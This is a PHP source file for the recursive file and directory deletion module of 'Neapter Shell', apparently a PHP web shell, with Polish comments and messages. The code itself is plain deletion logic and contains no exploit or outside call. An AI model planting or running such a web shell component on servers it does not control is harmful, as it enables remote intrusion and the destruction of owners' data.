<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Usuwanie pliku / katalogu
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleRemove extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'remove',
            'rm',
            'delete',
            'del',
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.3 2016-06-08 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie

	Użycie:
		remove ścieżka_do_katalogu_lub_pliku
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() !== 1) {
            return self::getHelp();
        }

        $sOutput = NULL;

        $sResource = $this->oArgs->getParam(0);

        if (is_file($sResource) || is_link($sResource)) {
            if (! @unlink($sResource)) {
                return sprintf('Plik "%s" nie został usunięty', $sResource);
            }

            return sprintf('Plik "%s" został usunięty', $sResource);
        }

        if (is_dir($sResource)) {
            /* Remove whole directory */
            try {
                $oDirectory = new RecursiveIteratorIterator(
                    new XRecursiveDirectoryIterator($sResource),
                    RecursiveIteratorIterator::CHILD_FIRST
                );

                foreach ($oDirectory as $oFile) {
                    if ($oFile->isDir()) {
                        /**
                         * PHP 5.2.X does not contain
                         * RecursiveDirectoryIterator::SKIP_DOTS
                         */
                        if (($oFile->getBasename() === '.')
                            || ($oFile->getBasename() === '..')
                        ) {
                            continue;
                        }

                        if (! @rmdir($oFile->getPathname())) {
                            $sOutput .= sprintf(
                                "Katalog \"%s\" nie został usunięty\r\n",
                                $oFile->getPathname()
                            );
                        }
                    } else {
                        if (! @unlink($oFile->getPathname())) {
                            $sOutput .= sprintf(
                                "Plik    \"%s\" nie został usunięty\r\n",
                                $oFile->getPathname()
                            );
                        }
                    }
                }

                $oDirectory = NULL;

                if (!rmdir($sResource)) {
                    return $sOutput . sprintf(
                        'Katalog "%s" nie został usunięty',
                        $sResource
                    );
                }
            } catch (Exception $oException) {
                return sprintf(
                    "Nie można otworzyć katalogu \"%s\"\r\n\r\nErro: %s",
                    $sDir,
                    $oException->getMessage()
                );
            }

            return sprintf('Katalog "%s" został usunięty', $sResource);
        }

        return sprintf('Podana ścieżka "%s" nie istnieje', $sResource);
    }

}
